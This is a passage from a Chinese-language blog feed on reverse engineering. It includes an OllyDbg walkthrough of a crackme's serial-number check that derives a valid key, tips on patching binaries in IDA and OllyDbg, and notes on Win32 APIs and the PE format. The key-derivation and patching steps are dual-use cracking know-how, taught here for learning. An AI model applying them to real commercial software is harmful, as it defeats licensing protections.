2C           je      short 011519C7</div><div class="line">0115199B    0FB710          movzx   edx, word ptr [eax]</div><div class="line">0115199E    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519A1    33C0            xor     eax, eax</div><div class="line">011519A3    66:3B11         cmp     dx, word ptr [ecx]</div><div class="line">011519A6    74 10           je      short 011519B8</div><div class="line">011519A8    40              inc     eax</div><div class="line">011519A9    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519AC    66:833C41 00    cmp     word ptr [ecx+eax*2], 0x0</div><div class="line">011519B1    8D0C41          lea     ecx, dword ptr [ecx+eax*2]</div><div class="line">011519B4  ^ 75 ED           jnz     short 011519A3</div><div class="line">011519B6    EB 0B           jmp     short 011519C3</div><div class="line">011519B8    66:8B4445 B0    mov     ax, word ptr [ebp+eax*2-0x50]</div><div class="line">011519BD    66:8903         mov     word ptr [ebx], ax</div><div class="line">011519C0    83C3 02         add     ebx, 0x2</div><div class="line">011519C3    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">011519C7    46              inc     esi</div><div class="line">011519C8    66:833C77 00    cmp     word ptr [edi+esi*2], 0x0</div><div class="line">011519CD    8D0477          lea     eax, dword ptr [edi+esi*2]</div><div class="line">011519D0  ^ 75 C4           jnz     short 01151996</div><div class="line">011519D2    8B5D AC         mov     ebx, dword ptr [ebp-0x54]</div><div class="line">011519D5    33C9            xor     ecx, ecx</div><div class="line">011519D7    8D45 F0         lea     eax, dword ptr [ebp-0x10]</div><div class="line">011519DA    66:394D F0      cmp     word ptr [ebp-0x10], cx</div><div class="line">011519DE    74 59           je      short 01151A39</div><div class="line">011519E0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">011519E3    41              inc     ecx</div><div class="line">011519E4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">011519E8  ^ 75 F6           jnz     short 011519E0</div><div class="line">011519EA    83F9 02         cmp     ecx, 0x2</div><div class="line">011519ED    75 4A           jnz     short 01151A39</div><div class="line">011519EF    33C0            xor     eax, eax</div><div class="line">011519F1    C745 F0 3100350&gt;mov     dword ptr [ebp-0x10], 0x350031</div><div class="line">011519F8    C745 F4 5000420&gt;mov     dword ptr [ebp-0xC], 0x420050</div><div class="line">011519FF    8D77 04         lea     esi, dword ptr [edi+0x4]</div><div class="line">01151A02    66:8945 F8      mov     word ptr [ebp-0x8], ax</div><div class="line">01151A06    33C9            xor     ecx, ecx</div><div class="line">01151A08    0F1F            ???                                      ; 未知命令</div><div class="line">01151A0A    8400            test    byte ptr [eax], al</div><div class="line">01151A0C    0000            add     byte ptr [eax], al</div><div class="line">01151A0E    0000            add     byte ptr [eax], al</div><div class="line">01151A10    66:8B444D F0    mov     ax, word ptr [ebp+ecx*2-0x10]</div><div class="line">01151A15    66:3B06         cmp     ax, word ptr [esi]</div><div class="line">01151A18    75 1F           jnz     short 01151A39</div><div class="line">01151A1A    41              inc     ecx</div><div class="line">01151A1B    83C6 02         add     esi, 0x2</div><div class="line">01151A1E    83F9 04         cmp     ecx, 0x4</div><div class="line">01151A21  ^ 72 ED           jb      short 01151A10</div><div class="line">01151A23    8BD7            mov     edx, edi</div><div class="line">01151A25    8BCB            mov     ecx, ebx</div><div class="line">01151A27    E8 14FDFFFF     call    01151740         ; 这里是最后判断的call，</div><div class="line">01151A2C    6A 00           push    0x0</div><div class="line">01151A2E    85C0            test    eax, eax</div><div class="line">01151A30    74 09           je      short 01151A3B</div><div class="line">01151A32    68 0B040000     push    0x40B</div><div class="line">01151A37    EB 07           jmp     short 01151A40</div><div class="line">01151A39    6A 00           push    0x0</div><div class="line">01151A3B    68 0A040000     push    0x40A</div><div class="line">01151A40    68 11010000     push    0x111</div><div class="line">01151A45    FF73 04         push    dword ptr [ebx+0x4]</div><div class="line">01151A48    FF15 54811601   call    dword ptr [&lt;&amp;USER32.PostMessageW&gt;; user32.PostMessageW</div></pre></td></tr></table></figure></p><p>以上代码比如初始化0-9,a-z，注册码转换成大写，提取出注册码里所有的字母，纯属多余<br>接下去直接看里面最后的call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01151810   &gt; /66:8B01       mov     ax, word ptr [ecx]</div><div class="line">01151813   . |66:3B040E     cmp     ax, word ptr [esi+ecx]           ;  判断第1,2位是否为&apos;12&apos;</div><div class="line">01151817   . |75 42         jnz     short 0115185B</div><div class="line">01151819   . |83C2 06       add     edx, 0x6</div><div class="line">0115181C   . |83C1 02       add     ecx, 0x2</div><div class="line">0115181F   . |83FA 39       cmp     edx, 0x39</div><div class="line">01151822   .^\7E EC         jle     short 01151810</div><div class="line">01151824   .  0FB74F 12     movzx   ecx, word ptr [edi+0x12]    ； 第i位字符+第1位字符是否为0x63（设计不合理?）</div><div class="line">01151828   .  0FB703        movzx   eax, word ptr [ebx]</div><div class="line">0115182B   .  03C8          add     ecx, eax</div><div class="line">0115182D   .  83F9 63       cmp     ecx, 0x63</div><div class="line">01151830   .  75 29         jnz     short 0115185B</div><div class="line">01151832   .  8B45 B4       mov     eax, dword ptr [ebp-0x4C]</div><div class="line">01151835   .  0FB74F 0C     movzx   ecx, word ptr [edi+0xC]</div><div class="line">01151839   .  0308          add     ecx, dword ptr [eax]</div><div class="line">0115183B   .  8B45 B0       mov     eax, dword ptr [ebp-0x50]</div><div class="line">0115183E   .  0FB700        movzx   eax, word ptr [eax]</div><div class="line">01151841   .  3BC1          cmp     eax, ecx</div><div class="line">01151843   .  75 16         jnz     short 0115185B    ; 这里判断注册码最后一位是否等于用&apos;123456789&apos;替换了注册码的n位之后的字符判断的第0x0c位+n是否相等</div><div class="line">01151845   .  5F            pop     edi</div><div class="line">01151846   .  5E            pop     esi</div><div class="line">01151847   .  B8 01000000   mov     eax, 0x1</div><div class="line">0115184C   .  5B            pop     ebx</div></pre></td></tr></table></figure></p><p>以上分析完成得到一组注册码1215pb8<br>1）包含字符’b’’’p’<br>2)  7位长度<br>3)  第1、2位为’1’’2’<br>4） 第0位字符’1’(0x30)+第n位字符(计数所在位)’2’(0x32) = 0x63<br>5)  第3、4、5、6位为’15pb’<br>6)  最后1位为‘7’+计数</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦,看雪论坛是个软件安全技术交流场所，为安全技术爱好者提供一个技术交流平台和资源。从单一版块『软件调试论坛』，发展到以软件安全技术为主题多个版块的综合论坛。其实这是一个超级大神级别的存在，来膜拜一波&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_ida_od的常用小技巧</title>
    <link href="http://yoursite.com/2018/03/23/re_6_ida/"/>
    <id>http://yoursite.com/2018/03/23/re_6_ida/</id>
    <published>2018-03-23T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:37.754Z</updated>
    
    <content type="html"><![CDATA[<p>IDA和OD是逆向中必不可少的一部分，现在来分享一下IDA和OD的一些技巧<br><a id="more"></a></p><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="1、查找字符串"><a href="#1、查找字符串" class="headerlink" title="1、查找字符串"></a>1、查找字符串</h2><p>(Shift+f9)View-&gt;open subviews-&gt;Strings</p><h2 id="2、修改文件，打补丁-patch"><a href="#2、修改文件，打补丁-patch" class="headerlink" title="2、修改文件，打补丁(patch)"></a>2、修改文件，打补丁(patch)</h2><p>1、找到修改地方<br>2、修改文件，也可以在(Hex view)窗口修改16进制:双击要修改的地方 -&gt;使用F2捷方式修改当前字节 -&gt;再按下F2快捷方式应用修改。<br>3、保存文件修改后的文件:[IDA Main Menu]-&gt;[Edit]-&gt;[PatchProgram]-&gt;[Apply patches to input file…]<br>IDA图形视图会有执行流，Yes箭头默认为绿色，No箭头默认为红色，蓝色表示默认下一个执行块。</p><h2 id="3、ida无法识别，红色代码，不能f5"><a href="#3、ida无法识别，红色代码，不能f5" class="headerlink" title="3、ida无法识别，红色代码，不能f5"></a>3、ida无法识别，红色代码，不能f5</h2><p>如果地址是红色，当f5时会出现这句话：The function has undefined instruction/data at the specified address.那就创建一个函数(P)，当创建函数时，会出现这句话：The function has undefined instruction/data at the specified address.Your request has been put in the autoanalysis queue<br>如果我们不能创建函数,就不能使用F5来分析代码了,想让这些代码变绿色的方法(创建函数)很简单.<br>用鼠标从函数头部开始到 retn 结尾 拖一下,变成灰色.<br><img src="https://i.imgur.com/1odLgE0.png" alt=""><br>然后用快捷键 P 或者右键菜单,CreateFunction 来创建函数就可以了。当然了,到这里也不算完.下图是代码变绿色的,我用上面的方法创建函数了,可还是不能F5,我们通过Stack Pointer (option-&gt;General-&gt;Disassembly选中stack pointer)发现这个函数的堆栈是不平衡的.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.我们看到 retn 左边绿色的数字是 28,我们通过ALT + k 修正堆栈,把 28 retn 改成 0 就可以了。修正堆栈的时候一定要选择 Call 然后修正堆栈,下图是修正后的 代码</p><h2 id="4、常用快捷键"><a href="#4、常用快捷键" class="headerlink" title="4、常用快捷键"></a>4、常用快捷键</h2><p>1、快捷键F5显示C伪代码<br>2、(Shift+f9)查找字符串<br>3、快捷键Alt+T，打开文本搜索对话框，在String文本框中输入要搜索的字符串点击OK即可<br>4、翻页 esc 和 Ctrl+Enter<br>5、使用小键盘“-”，“+”查看函数之间的关系<br>6、G跳转地址<br>7、使用快捷键”*”把变量重定义为数组<br>8、对于数字，16进制和10进制转换(H),转化成10字符(R)</p><h1 id="OD-olldbg"><a href="#OD-olldbg" class="headerlink" title="OD(olldbg)"></a>OD(olldbg)</h1><h2 id="1、常用快捷键"><a href="#1、常用快捷键" class="headerlink" title="1、常用快捷键"></a>1、常用快捷键</h2><p>0、f2下断点<br>1、f7进入call<br>2、f8不进入call<br>3、f9运行<br>4、f4运行到当前位置<br>5、’-‘回到上一步的位置<br>6、’*’回到当前运行的位置<br>7、Ctrl+F2  重新运行程序到起始处，用于重新调试程序<br>8、Ctrl+G 寻找十六进制地址<br>9、Alt+F2 关闭被调试程序。<br>10、f3 选择可执行文件<br>11、ctrl+b 在地址栏进行查找字符串<br>12、m -&gt; 查找</p><h2 id="OD上面图标"><a href="#OD上面图标" class="headerlink" title="OD上面图标"></a>OD上面图标</h2><p>1、’b’查看断点<br>2、’m’打开内存<br>3、’c’回到反汇编窗口</p><h2 id="OD保存文件"><a href="#OD保存文件" class="headerlink" title="OD保存文件"></a>OD保存文件</h2><p>1、寻找到需要patch的地方<br>2、修改(patch)文件<br>3、 保存文件: 窗口中选中修改过的语句—&gt;右击—&gt;复制到可执行文件—&gt;“选择”或者“所有修改”—&gt;出现“文件”窗口—&gt;右击—&gt;保存文件</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IDA和OD是逆向中必不可少的一部分，现在来分享一下IDA和OD的一些技巧&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_加密与解密</title>
    <link href="http://yoursite.com/2018/03/18/re_5_encode_and_decode_base/"/>
    <id>http://yoursite.com/2018/03/18/re_5_encode_and_decode_base/</id>
    <published>2018-03-18T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:31.768Z</updated>
    
    <content type="html"><![CDATA[<p>迟迟没有学习的加密与解密，现在开始吧<br><a id="more"></a></p><h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="一、Win-API简介"><a href="#一、Win-API简介" class="headerlink" title="一、Win API简介"></a>一、Win API简介</h2><p>API(Application Programming Interface)应用程序编程接口。在早期，windows的主要部分只需要三个动态链接库中实现，这代表了windows三个主要子系统——Kernel,User和GDI.<br>Kernel:操作系统的核心功能服务，包括进程与线程控制，内存管理，文件访问等。<br>User:负责处理用户接口，包括键盘和鼠标输入，窗口和菜单管理等。<br>GDI:图形设备接口，允许程序在屏幕上和打印机上显示文本和图像。</p><h2 id="二、常用的Win32-API函数"><a href="#二、常用的Win32-API函数" class="headerlink" title="二、常用的Win32 API函数"></a>二、常用的Win32 API函数</h2><h3 id="1、GetWindowText函数"><a href="#1、GetWindowText函数" class="headerlink" title="1、GetWindowText函数"></a>1、GetWindowText函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetWindowText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hwnd,  <span class="comment">//窗口或文本控件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetWindowTextA,Unicode版是GetWindowTextW.</p><h3 id="2、GetDlgItem函数"><a href="#2、GetDlgItem函数" class="headerlink" title="2、GetDlgItem函数"></a>2、GetDlgItem函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取制定对话框的句柄。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">HWND <span class="title">GetDlgItem</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,<span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem<span class="comment">//控件标识</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回对话框句柄，失败就返回零。</p><h3 id="3、GetDlgItemText函数"><a href="#3、GetDlgItemText函数" class="headerlink" title="3、GetDlgItemText函数"></a>3、GetDlgItemText函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的文本。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemTextA,Unicode版是GetDlgItemTextW.</p><h3 id="4、GetDlgItemInt函数"><a href="#4、GetDlgItemInt函数" class="headerlink" title="4、GetDlgItemInt函数"></a>4、GetDlgItemInt函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的整数。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemInt</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL *lpTranslated,<span class="comment">//接收成功/失败指示的指针</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL bSigned<span class="comment">//指定为有符号还是无符号</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemIntA,Unicode版是GetDlgItemIntW.</p><h2 id="5、MessageBox函数"><a href="#5、MessageBox函数" class="headerlink" title="5、MessageBox函数"></a>5、MessageBox函数</h2><p>此函数在USER32.DLL用户模块中，创建和显示信息框<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">MessageBox</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,  <span class="comment">//父窗口句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpText,<span class="comment">//消息框文本地址</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpCaption,<span class="comment">//消息框标题地址</span></span></span></div><div class="line"><span class="function"><span class="params">UINT uType<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是MessageBoxA,Unicode版是MessageBoxW.</p><h2 id="三、什么是句柄"><a href="#三、什么是句柄" class="headerlink" title="三、什么是句柄"></a>三、什么是句柄</h2><p>句柄(Handle)在Windows中使用非常频繁，它是Windows标识，由应用程序建立或使用的对象所使用的一个唯一的整数值(通常32位)。程序通过调用Windows函数获取句柄，然后在其他Window函数中使用这个句柄，以引用它代表的的对象。句柄的实际值对程序来说无关紧要。</p><h2 id="四、Windows消息机制"><a href="#四、Windows消息机制" class="headerlink" title="四、Windows消息机制"></a>四、Windows消息机制</h2><p>Windows是一个消息(Message)驱动式系统，Windows消息提供应用程序与应用程序，应用程序与Windows系统之间进行通信的手段。应用程序想要实现的 功能由消息来触发，并且靠对消息的响应和处理来完成。<br>Windows系统中有两种消息列队:一种是系统消息列队，另一种是应用程序消息列队。计算机的所有输入设备由Windows监控。当一个事件发生时，Windwos先将输入的消息放入系统消息队列中，再将输入的消息拷贝到相应的程序队列中，应用程序中的消息循环从它的消息队列中检索每个消息并且发给相应的窗口函数中。总是按到达的先后排队(一些系统消息除外)，这就使得一些外部实时事件可能得不到及时的处理。</p><h3 id="1、SendMessage函数"><a href="#1、SendMessage函数" class="headerlink" title="1、SendMessage函数"></a>1、SendMessage函数</h3><p>调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT <span class="title">SendMessage</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,<span class="comment">//目的窗口的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">UINT Msg,<span class="comment">//消息标识符</span></span></span></div><div class="line"><span class="function"><span class="params">WPARAM wParam,<span class="comment">//消息的WPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">//消息的LPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：由具体的消息决定，如消息投递成功，返回TURE(非零)</p><h3 id="2、WM-COMMAND消息"><a href="#2、WM-COMMAND消息" class="headerlink" title="2、WM_COMMAND消息"></a>2、WM_COMMAND消息</h3><p>当用户从菜单或按钮中选择一条命令或者一个控件发给它的父窗口，或者当一个快捷键被释放时发送。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WM_COMMAND</div><div class="line">wNotifyCode = HIWORD(wParam);<span class="comment">//通告代码</span></div><div class="line">wID = LOWORD(wParam)   <span class="comment">//菜单条目，控件标识符</span></div><div class="line">hwndCtl = (HWND) lParam, <span class="comment">//控件句柄</span></div><div class="line">)</div></pre></td></tr></table></figure></p><p>返回值：系统处理这条消息，返回零</p><h2 id="五、虚拟内存"><a href="#五、虚拟内存" class="headerlink" title="五、虚拟内存"></a>五、虚拟内存</h2><p>虚拟内存(Virtual Memory)不是真正的内存,他通过映射(Map)的方法，使可使用的虚拟地址(Virtual Address)达到4GB。<br>简单地说，虚拟内存的实现方法和过程如下:</p><p>(1)当一个应用程序被启动时，操作系统就创建一个新进程，并给每个进程分配2GB的虚拟地址(不是内存，是地址)<br>(2)虚拟内存管理器将应用程序的代码映射到那个程序代码的物理地址中的某个位置，并把当前所需要的代码读取到物理地址中(虚拟地址和应用程序代码在的物理内存中的位置是没有关系的)<br>(3)如果使用动态链接库DLL,DLL也被映射到进程的虚拟地址的空间，在需要的时候才被读入物理内存<br>(4)其它项目(例如数据，堆栈等)的空间是从物理内存中分配的，并被映射到虚拟空间中<br>(5)应用程序通过使用它的虚拟地址空间中的地址开始执行，然后虚拟内存管理器每次把内存的内存访问映射到物理位置<br>如果上面步骤不能理解，那明白以下几点就可以了：<br>1、应用程序不会直接访问物理地址<br>2、虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问<br>3、每个应用程序都有互相独立的4GB寻址空间，不同应用程序的地址空间是隔离的<br>4、DLL程序没有自己”私有”空间，它们总是被映射打其它应用程序的地址空间。</p><h3 id="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"><a href="#使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。" class="headerlink" title="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"></a>使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。</h3><h2 id="六、简单介绍PE"><a href="#六、简单介绍PE" class="headerlink" title="六、简单介绍PE"></a>六、简单介绍PE</h2><p>Windows的可执行文件(EXE,DLL)是PE(Portable Executable)格式。PE文件使用的一个平面地址空间 ，所有的数据都被合并在一起，组成一个很大的结构。文件的内容被分割成不同的区块(Section,又称区段，节等)，块中包含代码和数据。每一个块都有他自己在内存中的一套属性(可读，可写等)。<br>每一个区块都有不同的名字，这个名字表示区块代码的功能。常见的区块有.text,.rdata,.data,.rsrc等<br>.text:是在编译或汇编结束时产生的一种块，它的内容全是指令代码<br>.rdata:是运行期只读数据<br>.data:是初始化的数据块<br>.idata:包含其它外来DLL的函数技巧数据，即输入表。<br>.rsrc:包含模块的全部资源，如图标，菜单，位图等。<br>PE文件非常好的一个地方就是在磁盘上的数据与内存中的结构图是一致的。<br><img src="http://chuantu.biz/t6/190/1514609990x-1566657870.png" alt=""><br>PE相关的名词解释如下:<br>(1)入口点(Entry Point)<br>PE文件执行时的入口点。也就是程序在执行时的第一行代码的地址应该是就这个值。<br>(2)文件偏移地址(File Offset)<br>当PE文件存储在磁盘上时，各数据的地址称做文件偏移地址 ，文件偏移地址从PE文件的第一个字节开始计数，起始值是0<br>(3)虚拟地址(Virtual Address,VA)<br>由于Windows程序运行在386保护模式下，所以程序访问存储器所使用的逻辑地址称为虚拟地址VA,又称为内存偏移地址。<br>(4)基地址(ImageBase)<br>文件执行时将被映射到指定的地址中，这个初始化内存地址称为基地址，这个值是由PE文件本身设定的。<br>(5)相对虚拟地址(Relative Virual Address,RVA)<br>表示此段代码在内存中相对于基地址的偏移,即：<br>相对虚拟地址（RVA）=虚拟地址（VA）-基址（ImageBase）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迟迟没有学习的加密与解密，现在开始吧&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_Pe</title>
    <link href="http://yoursite.com/2018/03/15/re_4_PE/"/>
    <id>http://yoursite.com/2018/03/15/re_4_PE/</id>
    <published>2018-03-15T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:22.641Z</updated>
    
    <content type="html"><![CDATA[<p>复习可执行文件的文件结构——PE。PE文件是微软Windows操作系统上的程序文件，意为可移植的可执行的文件。PE的段头直接沿用的COFF 的段头结构。<br><a id="more"></a></p><h1 id="1、PE的结构"><a href="#1、PE的结构" class="headerlink" title="1、PE的结构"></a>1、PE的结构</h1><p><img src="https://i.imgur.com/vfm1qtj.jpg" alt=""><br>DOS头: 是DOS命令窗口下可以执行，其实没有PE文件也是可以执行的（听说是老一辈习惯啦DOS命令下执行，就加上去啦）。<br>NT头: 是PE中最大的结构体啦，其中有签名，文件头和可选头。<br>节区头: 定义(代码，数据，资源等的大小，起始位置，权限等)</p><h1 id="2、DOS头"><a href="#2、DOS头" class="headerlink" title="2、DOS头"></a>2、DOS头</h1><p>DOS结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>          <span class="comment">// DOS .EXE header  </span></div><div class="line">        WORD   e_magic;                     <span class="comment">// Magic number  </span></div><div class="line">        WORD   e_cblp;                      <span class="comment">// Bytes on last page of file  </span></div><div class="line">        WORD   e_cp;                        <span class="comment">// Pages in file  </span></div><div class="line">        WORD   e_crlc;                      <span class="comment">// Relocations  </span></div><div class="line">        WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs  </span></div><div class="line">        WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed  </span></div><div class="line">        WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed  </span></div><div class="line">        WORD   e_ss;                        <span class="comment">// Initial (relative) SS value  </span></div><div class="line">        WORD   e_sp;                        <span class="comment">// Initial SP value  </span></div><div class="line">        WORD   e_csum;                      <span class="comment">// Checksum  </span></div><div class="line">        WORD   e_ip;                        <span class="comment">// Initial IP value  </span></div><div class="line">        WORD   e_cs;                        <span class="comment">// Initial (relative) CS value  </span></div><div class="line">        WORD   e_lfarlc;                      <span class="comment">// File address of relocation table  </span></div><div class="line">        WORD   e_ovno;                      <span class="comment">// Overlay number  </span></div><div class="line">        WORD   e_res[<span class="number">4</span>];                     <span class="comment">// Reserved words  </span></div><div class="line">        WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)  </span></div><div class="line">        WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific  </span></div><div class="line">        WORD   e_res2[<span class="number">10</span>];                   <span class="comment">// Reserved words  </span></div><div class="line">        LONG   e_lfanew;                     <span class="comment">// File address of new exe header  </span></div><div class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</div></pre></td></tr></table></figure></p><h2 id="e-magic：所有PE开头都有DOS签名-“MZ”，这是以一个名叫Mark-Zbikowski的DOS可执行文件的设计者首字母命名的"><a href="#e-magic：所有PE开头都有DOS签名-“MZ”，这是以一个名叫Mark-Zbikowski的DOS可执行文件的设计者首字母命名的" class="headerlink" title="e_magic：所有PE开头都有DOS签名  “MZ”，这是以一个名叫Mark Zbikowski的DOS可执行文件的设计者首字母命名的"></a>e_magic：所有PE开头都有DOS签名  “MZ”，这是以一个名叫Mark Zbikowski的DOS可执行文件的设计者首字母命名的</h2><h2 id="e-lfanew-指向NT头的位置，long类型，占4个字节。例"><a href="#e-lfanew-指向NT头的位置，long类型，占4个字节。例" class="headerlink" title="e_lfanew:指向NT头的位置，long类型，占4个字节。例:"></a>e_lfanew:指向NT头的位置，long类型，占4个字节。例:</h2><p><img src="https://i.imgur.com/DancFFy.png" alt=""></p><h1 id="3、NT头"><a href="#3、NT头" class="headerlink" title="3、NT头"></a>3、NT头</h1><p>NT结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span>  </div><div class="line">      DWORD                 Signature;  </div><div class="line">      IMAGE_FILE_HEADER     FileHeader;  </div><div class="line">      IMAGE_OPTIONAL_HEADER OptionalHeader;  </div><div class="line">&#125; IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;</div></pre></td></tr></table></figure></p><p>第一个参数是: 一个PE标志。在一个有效的PE文件里，Signature字段被设置为00004550h。<br>第二个参数是: IMAGE_FILE_HEADER结构体。<br>第三个参数是: OptionalHeader结构体。</p><h2 id="NT文件头"><a href="#NT文件头" class="headerlink" 